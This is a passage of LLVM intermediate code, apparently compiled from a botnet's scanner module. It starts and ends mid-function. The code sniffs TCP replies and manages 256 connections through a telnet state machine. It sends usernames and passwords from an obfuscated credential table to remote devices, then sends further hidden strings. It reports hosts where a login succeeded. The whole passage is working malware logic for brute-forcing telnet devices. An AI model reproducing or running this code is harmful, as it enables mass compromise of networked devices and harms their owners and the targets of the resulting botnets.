  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i64 0, i64 0), i16 zeroext 15)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.13, i64 0, i64 0), i16 zeroext 15)
  %53 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 0
  %54 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 20
  %55 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %2, i64 0, i32 0, i64 0
  %56 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %3, i64 0, i32 0, i64 0
  %57 = bitcast i32* %6 to i8*
  %58 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 16
  %59 = bitcast i8* %58 to i32*
  %60 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 9
  %61 = bitcast i8* %54 to i16*
  %62 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 22
  %63 = bitcast i8* %62 to i16*
  %64 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 32
  %65 = bitcast i8* %64 to i16*
  %66 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 28
  %67 = bitcast i8* %66 to i32*
  %68 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 12
  %69 = bitcast i8* %68 to i32*
  br label %.loopexit213

.loopexit213.loopexit:                            ; preds = %.loopexit
  br label %.loopexit213

.loopexit213:                                     ; preds = %.loopexit213.loopexit, %.split
  %70 = tail call i32* @__errno_location() #11
  store i32 0, i32* %70, align 4
  %71 = load i32, i32* @rsck, align 4
  %72 = call i64 @recvfrom(i32 %71, i8* nonnull %53, i64 1514, i32 16384, %struct.sockaddr* null, i32* null) #10
  %73 = trunc i64 %72 to i32
  %74 = icmp slt i32 %73, 1
  br i1 %74, label %.thread, label %.lr.ph226.preheader

.lr.ph226.preheader:                              ; preds = %.loopexit213
  br label %.lr.ph226

.lr.ph226:                                        ; preds = %.lr.ph226.preheader, %.backedge
  %75 = phi i64 [ %125, %.backedge ], [ %72, %.lr.ph226.preheader ]
  %.0225 = phi i32 [ %.0.be, %.backedge ], [ 0, %.lr.ph226.preheader ]
  %76 = load i32, i32* %70, align 4
  %77 = icmp eq i32 %76, 11
  br i1 %77, label %.thread.loopexit256, label %78

; <label>:78:                                     ; preds = %.lr.ph226
  %sext = shl i64 %75, 32
  %79 = ashr exact i64 %sext, 32
  %80 = icmp ult i64 %79, 40
  br i1 %80, label %.backedge, label %81

; <label>:81:                                     ; preds = %78
  %82 = load i32, i32* %59, align 16
  %83 = load i32, i32* @LOCAL_ADDR, align 4
  %84 = icmp eq i32 %82, %83
  %85 = load i8, i8* %60, align 1
  %86 = icmp eq i8 %85, 6
  %or.cond240 = and i1 %84, %86
  br i1 %or.cond240, label %87, label %.backedge

; <label>:87:                                     ; preds = %81
  %88 = load i16, i16* %61, align 4
  %89 = icmp eq i16 %88, %49
  br i1 %89, label %95, label %90

; <label>:90:                                     ; preds = %87
  %91 = call zeroext i16 @htons(i16 zeroext 2323) #11
  %92 = icmp eq i16 %88, %91
  %93 = load i16, i16* %63, align 2
  %94 = icmp eq i16 %93, 0
  %or.cond242 = and i1 %92, %94
  br i1 %or.cond242, label %96, label %.backedge

; <label>:95:                                     ; preds = %87
  %.old = load i16, i16* %63, align 2
  %.old241 = icmp eq i16 %.old, 0
  br i1 %.old241, label %96, label %.backedge

; <label>:96:                                     ; preds = %90, %95
  %97 = load i16, i16* %65, align 16
  %98 = and i16 %97, 5888
  %99 = icmp eq i16 %98, 4608
  br i1 %99, label %100, label %.backedge

; <label>:100:                                    ; preds = %96
  %101 = load i32, i32* %67, align 4
  %102 = call i32 @ntohl(i32 %101) #11
  %103 = add i32 %102, -1
  %104 = call i32 @htonl(i32 %103) #11
  %105 = load i32, i32* %69, align 4
  %106 = icmp eq i32 %104, %105
  br i1 %106, label %.preheader, label %.backedge

.preheader:                                       ; preds = %100
  %107 = icmp slt i32 %.0225, 256
  br i1 %107, label %.lr.ph, label %.thread.loopexit256

.lr.ph:                                           ; preds = %.preheader
  %108 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %109 = sext i32 %.0225 to i64
  br label %110

; <label>:110:                                    ; preds = %.lr.ph, %114
  %indvars.iv = phi i64 [ %109, %.lr.ph ], [ %indvars.iv.next, %114 ]
  %111 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %108, i64 %indvars.iv, i32 3
  %112 = load i32, i32* %111, align 8
  %113 = icmp eq i32 %112, 0
  br i1 %113, label %116, label %114

; <label>:114:                                    ; preds = %110
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %115 = icmp slt i64 %indvars.iv.next, 256
  br i1 %115, label %110, label %.thread.loopexit

; <label>:116:                                    ; preds = %110
  %117 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %108, i64 %indvars.iv
  %118 = icmp eq %struct.scanner_connection* %117, null
  br i1 %118, label %.thread.loopexit256, label %119

; <label>:119:                                    ; preds = %116
  %120 = trunc i64 %indvars.iv to i32
  %121 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %108, i64 %indvars.iv, i32 4
  store i32 %104, i32* %121, align 4
  %122 = load i16, i16* %61, align 4
  %123 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %108, i64 %indvars.iv, i32 5
  store i16 %122, i16* %123, align 8
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %117)
  br label %.backedge

.backedge:                                        ; preds = %119, %78, %81, %95, %100, %90, %96
  %.0.be = phi i32 [ %.0225, %78 ], [ %.0225, %81 ], [ %.0225, %90 ], [ %.0225, %95 ], [ %.0225, %100 ], [ %120, %119 ], [ %.0225, %96 ]
  store i32 0, i32* %70, align 4
  %124 = load i32, i32* @rsck, align 4
  %125 = call i64 @recvfrom(i32 %124, i8* nonnull %53, i64 1514, i32 16384, %struct.sockaddr* null, i32* null) #10
  %126 = trunc i64 %125 to i32
  %127 = icmp slt i32 %126, 1
  br i1 %127, label %.thread.loopexit256, label %.lr.ph226

.thread.loopexit:                                 ; preds = %114
  br label %.thread

.thread.loopexit256:                              ; preds = %.preheader, %.lr.ph226, %.backedge, %116
  br label %.thread

.thread:                                          ; preds = %.thread.loopexit256, %.thread.loopexit, %.loopexit213
  %128 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %55) #10, !srcloc !8
  %129 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %56) #10, !srcloc !9
  store i32 0, i32* %1, align 4
  br label %130

; <label>:130:                                    ; preds = %.thread, %.thread206
  %.0188234 = phi i32 [ 0, %.thread ], [ %.1189, %.thread206 ]
  %.0190233 = phi i32 [ 0, %.thread ], [ %.1191, %.thread206 ]
  %storemerge197232 = phi i32 [ 0, %.thread ], [ %180, %.thread206 ]
  %131 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %132 = sext i32 %storemerge197232 to i64
  %133 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %131, i64 %132
  %134 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %131, i64 %132, i32 3
  %135 = load i32, i32* %134, align 8
  %136 = icmp eq i32 %135, 0
  br i1 %136, label %.thread206, label %137

; <label>:137:                                    ; preds = %130
  %138 = icmp ne i32 %135, 1
  %139 = select i1 %138, i32 30, i32 5
  %140 = load i32, i32* @fake_time, align 4
  %141 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %131, i64 %132, i32 2
  %142 = load i32, i32* %141, align 4
  %143 = sub i32 %140, %142
  %144 = icmp ugt i32 %143, %139
  br i1 %144, label %145, label %159

; <label>:145:                                    ; preds = %137
  %146 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %131, i64 %132, i32 1
  %147 = load i32, i32* %146, align 8
  %148 = call i32 @close(i32 %147) #10
  store i32 -1, i32* %146, align 8
  %149 = load i32, i32* %134, align 8
  %150 = icmp ugt i32 %149, 2
  %151 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %131, i64 %132, i32 8
  br i1 %150, label %152, label %158

; <label>:152:                                    ; preds = %145
  %153 = load i8, i8* %151, align 8
  %154 = add i8 %153, 1
  store i8 %154, i8* %151, align 8
  %155 = icmp eq i8 %154, 10
  br i1 %155, label %156, label %157

; <label>:156:                                    ; preds = %152
  store i8 0, i8* %151, align 8
  store i32 0, i32* %134, align 8
  br label %.thread206

; <label>:157:                                    ; preds = %152
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %133)
  br label %.thread206

; <label>:158:                                    ; preds = %145
  store i8 0, i8* %151, align 8
  store i32 0, i32* %134, align 8
  br label %.thread206

; <label>:159:                                    ; preds = %137
  %cond = icmp eq i32 %135, 1
  %160 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %131, i64 %132, i32 1
  %161 = load i32, i32* %160, align 8
  %162 = srem i32 %161, 64
  %163 = zext i32 %162 to i64
  %164 = shl i64 1, %163
  %165 = sdiv i32 %161, 64
  %166 = sext i32 %165 to i64
  br i1 %cond, label %167, label %173

; <label>:167:                                    ; preds = %159
  %168 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %3, i64 0, i32 0, i64 %166
  %169 = load i64, i64* %168, align 8
  %170 = or i64 %164, %169
  store i64 %170, i64* %168, align 8
  %171 = load i32, i32* %160, align 8
  %172 = icmp sgt i32 %171, %.0190233
  %..0190 = select i1 %172, i32 %171, i32 %.0190233
  br label %.thread206

; <label>:173:                                    ; preds = %159
  %174 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %2, i64 0, i32 0, i64 %166
  %175 = load i64, i64* %174, align 8
  %176 = or i64 %164, %175
  store i64 %176, i64* %174, align 8
  %177 = load i32, i32* %160, align 8
  %178 = icmp sgt i32 %177, %.0188234
  %..0188 = select i1 %178, i32 %177, i32 %.0188234
  br label %.thread206

.thread206:                                       ; preds = %130, %173, %167, %158, %157, %156
  %.1191 = phi i32 [ %.0190233, %156 ], [ %.0190233, %157 ], [ %.0190233, %158 ], [ %..0190, %167 ], [ %.0190233, %173 ], [ %.0190233, %130 ]
  %.1189 = phi i32 [ %.0188234, %156 ], [ %.0188234, %157 ], [ %.0188234, %158 ], [ %.0188234, %167 ], [ %..0188, %173 ], [ %.0188234, %130 ]
  %179 = load i32, i32* %1, align 4
  %180 = add nsw i32 %179, 1
  store i32 %180, i32* %1, align 4
  %181 = icmp slt i32 %180, 256
  br i1 %181, label %130, label %182

; <label>:182:                                    ; preds = %.thread206
  store <2 x i64> <i64 1, i64 0>, <2 x i64>* %4, align 16
  %183 = icmp sgt i32 %.1191, %.1189
  %184 = select i1 %183, i32 %.1191, i32 %.1189
  %185 = add nsw i32 %184, 1
  %186 = call i32 @select(i32 %185, %struct.fd_set.28* nonnull %2, %struct.fd_set.28* nonnull %3, %struct.fd_set.28* null, %struct.timeval.29* nonnull %tmpcast) #10
  %187 = call i64 @time(i64* null) #10
  %188 = trunc i64 %187 to i32
  store i32 %188, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %189

; <label>:189:                                    ; preds = %182, %.loopexit
  %storemerge198236 = phi i32 [ 0, %182 ], [ %387, %.loopexit ]
  %190 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %191 = sext i32 %storemerge198236 to i64
  %192 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191
  %193 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 1
  %194 = load i32, i32* %193, align 8
  %195 = icmp eq i32 %194, -1
  br i1 %195, label %.loopexit, label %196

; <label>:196:                                    ; preds = %189
  %197 = sdiv i32 %194, 64
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %3, i64 0, i32 0, i64 %198
  %200 = load i64, i64* %199, align 8
  %201 = srem i32 %194, 64
  %202 = zext i32 %201 to i64
  %203 = shl i64 1, %202
  %204 = and i64 %200, %203
  %205 = icmp eq i64 %204, 0
  br i1 %205, label %221, label %206

; <label>:206:                                    ; preds = %196
  store i32 0, i32* %6, align 4
  store i32 4, i32* %7, align 4
  %207 = call i32 @getsockopt(i32 %194, i32 1, i32 4, i8* nonnull %57, i32* nonnull %7) #10
  %208 = load i32, i32* %6, align 4
  %209 = or i32 %208, %207
  %210 = icmp eq i32 %209, 0
  br i1 %210, label %211, label %216

; <label>:211:                                    ; preds = %206
  %212 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 3
  store i32 2, i32* %212, align 8
  %213 = call fastcc %struct.scanner_auth* @random_auth_entry()
  %214 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %192, i64 0, i32 0
  store %struct.scanner_auth* %213, %struct.scanner_auth** %214, align 8
  %215 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 6
  store i32 0, i32* %215, align 4
  %.pre = load i32, i32* %193, align 8
  br label %221

; <label>:216:                                    ; preds = %206
  %217 = load i32, i32* %193, align 8
  %218 = call i32 @close(i32 %217) #10
  store i32 -1, i32* %193, align 8
  %219 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 8
  store i8 0, i8* %219, align 8
  %220 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 3
  store i32 0, i32* %220, align 8
  br label %.loopexit

; <label>:221:                                    ; preds = %196, %211
  %222 = phi i32 [ %194, %196 ], [ %.pre, %211 ]
  %223 = sdiv i32 %222, 64
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %2, i64 0, i32 0, i64 %224
  %226 = load i64, i64* %225, align 8
  %227 = srem i32 %222, 64
  %228 = zext i32 %227 to i64
  %229 = shl i64 1, %228
  %230 = and i64 %229, %226
  %231 = icmp eq i64 %230, 0
  br i1 %231, label %.loopexit, label %.thread210.preheader

.thread210.preheader:                             ; preds = %221
  %232 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 3
  %233 = load i32, i32* %232, align 8
  %234 = icmp eq i32 %233, 0
  br i1 %234, label %.loopexit, label %.lr.ph235

.lr.ph235:                                        ; preds = %.thread210.preheader
  %235 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 6
  %236 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 7, i64 0
  %237 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 7, i64 64
  %238 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 2
  %239 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %192, i64 0, i32 0
  %240 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 8
  %241 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 4
  %242 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 5
  br label %245

.thread210.loopexit.loopexit:                     ; preds = %270
  br label %.thread210.loopexit

.thread210.loopexit:                              ; preds = %.thread210.loopexit.loopexit, %..thread210.loopexit_crit_edge
  %243 = phi i32 [ %.pre249, %..thread210.loopexit_crit_edge ], [ %271, %.thread210.loopexit.loopexit ]
  %244 = icmp eq i32 %243, 0
  br i1 %244, label %.loopexit.loopexit, label %245

; <label>:245:                                    ; preds = %.lr.ph235, %.thread210.loopexit
  %246 = load i32, i32* %235, align 4
  %247 = icmp eq i32 %246, 256
  br i1 %247, label %248, label %249

; <label>:248:                                    ; preds = %245
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %236, i8* nonnull %237, i64 192, i32 1, i1 false)
  store i32 192, i32* %235, align 4
  br label %249

; <label>:249:                                    ; preds = %248, %245
  store i32 0, i32* %70, align 4
  %250 = load i32, i32* %193, align 8
  %251 = load i32, i32* %235, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 7, i64 %252
  %254 = sub nsw i32 256, %251
  %255 = call i32 @recv_strip_null(i32 %250, i8* %253, i32 %254, i32 16384)
  switch i32 %255, label %266 [
    i32 0, label %.thread212
    i32 -1, label %256
  ]

.thread212:                                       ; preds = %249
  store i32 104, i32* %70, align 4
  br label %258

; <label>:256:                                    ; preds = %249
  %.pr211 = load i32, i32* %70, align 4
  %257 = icmp eq i32 %.pr211, 11
  br i1 %257, label %.loopexit, label %258

; <label>:258:                                    ; preds = %.thread212, %256
  %259 = load i32, i32* %193, align 8
  %260 = call i32 @close(i32 %259) #10
  store i32 -1, i32* %193, align 8
  %261 = load i8, i8* %240, align 8
  %262 = add i8 %261, 1
  store i8 %262, i8* %240, align 8
  %263 = icmp ugt i8 %262, 9
  br i1 %263, label %264, label %265

; <label>:264:                                    ; preds = %258
  store i8 0, i8* %240, align 8
  store i32 0, i32* %232, align 8
  br label %.loopexit

; <label>:265:                                    ; preds = %258
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %192)
  br label %.loopexit

; <label>:266:                                    ; preds = %249
  %267 = load i32, i32* %235, align 4
  %268 = add nsw i32 %267, %255
  store i32 %268, i32* %235, align 4
  %269 = load i32, i32* @fake_time, align 4
  store i32 %269, i32* %238, align 4
  br label %270

; <label>:270:                                    ; preds = %.thread208, %266
  %271 = load i32, i32* %232, align 8
  switch i32 %271, label %.thread210.loopexit.loopexit [
    i32 2, label %272
    i32 3, label %276
    i32 4, label %290
    i32 5, label %304
    i32 6, label %315
    i32 7, label %326
    i32 8, label %337
    i32 9, label %348
    i32 10, label %359
  ]

; <label>:272:                                    ; preds = %270
  %273 = call fastcc i32 @consume_iacs(%struct.scanner_connection* nonnull %192)
  %274 = icmp sgt i32 %273, 0
  br i1 %274, label %275, label %378

; <label>:275:                                    ; preds = %272
  store i32 3, i32* %232, align 8
  br label %.thread208

; <label>:276:                                    ; preds = %270
  %277 = call fastcc i32 @consume_user_prompt(%struct.scanner_connection* nonnull %192)
  %278 = icmp sgt i32 %277, 0
  br i1 %278, label %279, label %378

; <label>:279:                                    ; preds = %276
  %280 = load i32, i32* %193, align 8
  %281 = load %struct.scanner_auth*, %struct.scanner_auth** %239, align 8
  %282 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %281, i64 0, i32 0
  %283 = load i8*, i8** %282, align 8
  %284 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %281, i64 0, i32 4
  %285 = load i8, i8* %284, align 4
  %286 = zext i8 %285 to i64
  %287 = call i64 @send(i32 %280, i8* %283, i64 %286, i32 16384) #10
  %288 = load i32, i32* %193, align 8
  %289 = call i64 @send(i32 %288, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i64 2, i32 16384) #10
  store i32 4, i32* %232, align 8
  br label %.thread208

; <label>:290:                                    ; preds = %270
  %291 = call fastcc i32 @consume_pass_prompt(%struct.scanner_connection* nonnull %192)
  %292 = icmp sgt i32 %291, 0
  br i1 %292, label %293, label %378

; <label>:293:                                    ; preds = %290
  %294 = load i32, i32* %193, align 8
  %295 = load %struct.scanner_auth*, %struct.scanner_auth** %239, align 8
  %296 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %295, i64 0, i32 1
  %297 = load i8*, i8** %296, align 8
  %298 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %295, i64 0, i32 5
  %299 = load i8, i8* %298, align 1
  %300 = zext i8 %299 to i64
  %301 = call i64 @send(i32 %294, i8* %297, i64 %300, i32 16384) #10
  %302 = load i32, i32* %193, align 8
  %303 = call i64 @send(i32 %302, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i64 2, i32 16384) #10
  store i32 5, i32* %232, align 8
  br label %.thread208

; <label>:304:                                    ; preds = %270
  %305 = call fastcc i32 @consume_any_prompt(%struct.scanner_connection* nonnull %192)
  %306 = icmp sgt i32 %305, 0
  br i1 %306, label %307, label %378

; <label>:307:                                    ; preds = %304
  call void @table_unlock_val(i8 zeroext 5)
  %308 = call i8* @table_retrieve_val(i32 5, i32* nonnull %8)
  %309 = load i32, i32* %193, align 8
  %310 = load i32, i32* %8, align 4
  %311 = sext i32 %310 to i64
  %312 = call i64 @send(i32 %309, i8* %308, i64 %311, i32 16384) #10
  %313 = load i32, i32* %193, align 8
  %314 = call i64 @send(i32 %313, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i64 2, i32 16384) #10
  call void @table_lock_val(i8 zeroext 5)
  store i32 6, i32* %232, align 8
  br label %.thread208

; <label>:315:                                    ; preds = %270
  %316 = call fastcc i32 @consume_any_prompt(%struct.scanner_connection* nonnull %192)
  %317 = icmp sgt i32 %316, 0
  br i1 %317, label %318, label %378

; <label>:318:                                    ; preds = %315
  call void @table_unlock_val(i8 zeroext 6)
  %319 = call i8* @table_retrieve_val(i32 6, i32* nonnull %9)
  %320 = load i32, i32* %193, align 8
  %321 = load i32, i32* %9, align 4
  %322 = sext i32 %321 to i64
  %323 = call i64 @send(i32 %320, i8* %319, i64 %322, i32 16384) #10
  %324 = load i32, i32* %193, align 8
  %325 = call i64 @send(i32 %324, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i64 2, i32 16384) #10
  call void @table_lock_val(i8 zeroext 6)
  store i32 7, i32* %232, align 8
  br label %.thread208

; <label>:326:                                    ; preds = %270
  %327 = call fastcc i32 @consume_any_prompt(%struct.scanner_connection* nonnull %192)
  %328 = icmp sgt i32 %327, 0
  br i1 %328, label %329, label %378

; <label>:329:                                    ; preds = %326
  call void @table_unlock_val(i8 zeroext 4)
  %330 = call i8* @table_retrieve_val(i32 4, i32* nonnull %10)
  %331 = load i32, i32* %193, align 8
  %332 = load i32, i32* %10, align 4
  %333 = sext i32 %332 to i64
  %334 = call i64 @send(i32 %331, i8* %330, i64 %333, i32 16384) #10
  %335 = load i32, i32* %193, align 8
  %336 = call i64 @send(i32 %335, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i64 2, i32 16384) #10
  call void @table_lock_val(i8 zeroext 4)
  store i32 8, i32* %232, align 8
  br label %.thread208

; <label>:337:                                    ; preds = %270
  %338 = call fastcc i32 @consume_any_prompt(%struct.scanner_connection* nonnull %192)
  %339 = icmp sgt i32 %338, 0
  br i1 %339, label %340, label %378

; <label>:340:                                    ; preds = %337
  call void @table_unlock_val(i8 zeroext 7)
  %341 = call i8* @table_retrieve_val(i32 7, i32* nonnull %11)
  %342 = load i32, i32* %193, align 8
  %343 = load i32, i32* %11, align 4
  %344 = sext i32 %343 to i64
  %345 = call i64 @send(i32 %342, i8* %341, i64 %344, i32 16384) #10
  %346 = load i32, i32* %193, align 8
  %347 = call i64 @send(i32 %346, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i64 2, i32 16384) #10
  call void @table_lock_val(i8 zeroext 7)
  store i32 9, i32* %232, align 8
  br label %.thread208

; <label>:348:                                    ; preds = %270
  %349 = call fastcc i32 @consume_any_prompt(%struct.scanner_connection* nonnull %192)
  %350 = icmp sgt i32 %349, 0
  br i1 %350, label %351, label %378

; <label>:351:                                    ; preds = %348
  call void @table_unlock_val(i8 zeroext 8)
  %352 = call i8* @table_retrieve_val(i32 8, i32* nonnull %12)
  %353 = load i32, i32* %193, align 8
  %354 = load i32, i32* %12, align 4
  %355 = sext i32 %354 to i64
  %356 = call i64 @send(i32 %353, i8* %352, i64 %355, i32 16384) #10
  %357 = load i32, i32* %193, align 8
  %358 = call i64 @send(i32 %357, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i64 2, i32 16384) #10
  call void @table_lock_val(i8 zeroext 8)
  store i32 10, i32* %232, align 8
  br label %.thread208

; <label>:359:                                    ; preds = %270
  %360 = call fastcc i32 @consume_resp_prompt(%struct.scanner_connection* nonnull %192)
  %361 = icmp eq i32 %360, -1
  br i1 %361, label %362, label %370

; <label>:362:                                    ; preds = %359
  %363 = load i32, i32* %193, align 8
  %364 = call i32 @close(i32 %363) #10
  store i32 -1, i32* %193, align 8
  %365 = load i8, i8* %240, align 8
  %366 = add i8 %365, 1
  store i8 %366, i8* %240, align 8
  %367 = icmp eq i8 %366, 10
  br i1 %367, label %368, label %369

; <label>:368:                                    ; preds = %362
  store i8 0, i8* %240, align 8
  store i32 0, i32* %232, align 8
  br label %.thread208

; <label>:369:                                    ; preds = %362
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %192)
  br label %.thread208

; <label>:370:                                    ; preds = %359
  %371 = icmp sgt i32 %360, 0
  br i1 %371, label %372, label %378

; <label>:372:                                    ; preds = %370
  %373 = load i32, i32* %241, align 4
  %374 = load i16, i16* %242, align 8
  %375 = load %struct.scanner_auth*, %struct.scanner_auth** %239, align 8
  call fastcc void @report_working(i32 %373, i16 zeroext %374, %struct.scanner_auth* %375)
  %376 = load i32, i32* %193, align 8
  %377 = call i32 @close(i32 %376) #10
  store i32 -1, i32* %193, align 8
  store i32 0, i32* %232, align 8
  br label %.thread208

; <label>:378:                                    ; preds = %370, %348, %337, %326, %315, %304, %290, %276, %272
  %.0192 = phi i32 [ %360, %370 ], [ %349, %348 ], [ %338, %337 ], [ %327, %326 ], [ %316, %315 ], [ %305, %304 ], [ %291, %290 ], [ %277, %276 ], [ %273, %272 ]
  %379 = icmp eq i32 %.0192, 0
  br i1 %379, label %..thread210.loopexit_crit_edge, label %.thread208

..thread210.loopexit_crit_edge:                   ; preds = %378
  %.pre249 = load i32, i32* %232, align 8
  br label %.thread210.loopexit

.thread208:                                       ; preds = %275, %279, %293, %307, %318, %329, %340, %351, %372, %369, %368, %378
  %.0192209 = phi i32 [ %.0192, %378 ], [ %273, %275 ], [ %277, %279 ], [ %291, %293 ], [ %305, %307 ], [ %316, %318 ], [ %327, %329 ], [ %338, %340 ], [ %349, %351 ], [ %360, %372 ], [ -1, %369 ], [ -1, %368 ]
  %380 = load i32, i32* %235, align 4
  %381 = icmp sgt i32 %.0192209, %380
  %..0192 = select i1 %381, i32 %380, i32 %.0192209
  %382 = sub nsw i32 %380, %..0192
  store i32 %382, i32* %235, align 4
  %383 = sext i32 %..0192 to i64
  %384 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 7, i64 %383
  %385 = sext i32 %382 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %236, i8* %384, i64 %385, i32 1, i1 false)
  br label %270

.loopexit.loopexit:                               ; preds = %.thread210.loopexit
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.thread210.preheader, %256, %221, %265, %264, %189, %216
  %386 = load i32, i32* %1, align 4
  %387 = add nsw i32 %386, 1
  store i32 %387, i32* %1, align 4
  %388 = icmp slt i32 %387, 256
  br i1 %388, label %189, label %.loopexit213.loopexit
}

declare i32 @util_local_addr() local_unnamed_addr #3

declare void @rand_init() local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_auth_entry(i8*, i8*, i16 zeroext) unnamed_addr #0 {
  %4 = alloca i32, align 4
  %5 = load i8*, i8** bitcast (%struct.scanner_auth** @auth_table to i8**), align 8
  %6 = load i32, i32* @auth_table_len, align 4
  %7 = add nsw i32 %6, 1
  %8 = sext i32 %7 to i64
  %9 = mul nsw i64 %8, 24
  %10 = tail call i8* @realloc(i8* %5, i64 %9) #10
  store i8* %10, i8** bitcast (%struct.scanner_auth** @auth_table to i8**), align 8
  %11 = call fastcc i8* @deobf(i8* %0, i32* nonnull %4)
  %12 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %13 = load i32, i32* @auth_table_len, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %12, i64 %14, i32 0
  store i8* %11, i8** %15, align 8
  %16 = load i32, i32* %4, align 4
  %17 = trunc i32 %16 to i8
  %18 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %19 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %18, i64 %14, i32 4
  store i8 %17, i8* %19, align 4
  %20 = call fastcc i8* @deobf(i8* %1, i32* nonnull %4)
  %21 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %22 = load i32, i32* @auth_table_len, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i64 %23, i32 1
  store i8* %20, i8** %24, align 8
  %25 = load i32, i32* %4, align 4
  %26 = trunc i32 %25 to i8
